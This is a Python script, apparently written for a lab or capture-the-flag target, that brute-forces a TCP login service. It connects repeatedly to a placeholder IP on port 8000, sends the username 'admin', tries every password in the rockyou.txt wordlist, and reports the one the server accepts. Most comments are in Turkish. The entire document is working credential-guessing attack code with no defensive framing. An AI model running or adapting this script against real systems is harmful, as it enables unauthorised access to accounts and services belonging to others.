import socket

# Configuration
target_ip = "<targetip>"  # Target IP
target_port = 8000        # Target port
password_wordlist = "/usr/share/wordlists/rockyou.txt"  # Path to your password wordlist file

def connect_and_send_password(password):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))
        client_socket.sendall(b'admin\n')

        # İlk sunucu yanıtı kontrol ediliyor
        response = client_socket.recv(1024).decode()
        print(f"Server response after sending 'admin': {response}")

        # Şifre soruluyorsa şifreyi deniyoruz
        if "Password:" in response:
            print(f"Trying password: {password}")
            client_socket.sendall(password.encode() + b"\n")

            # Şifre gönderildikten sonra sunucunun yanıtını alıyoruz
            response = client_socket.recv(1024).decode()

            # Sunucu yanıtını ekrana yazdır
            print(f"Server response for password '{password}': {response}")

            # Eğer sunucu doğru şifreyi kabul ederse
            if "success" in response.lower() or "welcome" in response.lower():
                return True
            else:
                print(f"Password '{password}' is incorrect or no response.")
                return False

    except Exception as e:
        print(f"Error: {e}")
        return False

    finally:
        client_socket.close()

def fuzz_passwords():
    with open(password_wordlist, "r", encoding="ISO-8859-1") as file:  # encoding eklendi
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()  # Şifreyi formatla (boşluk ve yeni satır karakterlerini kaldır)

        if connect_and_send_password(password):
            print(f"Correct password found: {password}")
            break  # Şifre bulunduysa döngüden çık
        else:
            print(f"Password {password} was incorrect. Reconnecting...")

if __name__ == "__main__":
    fuzz_passwords()
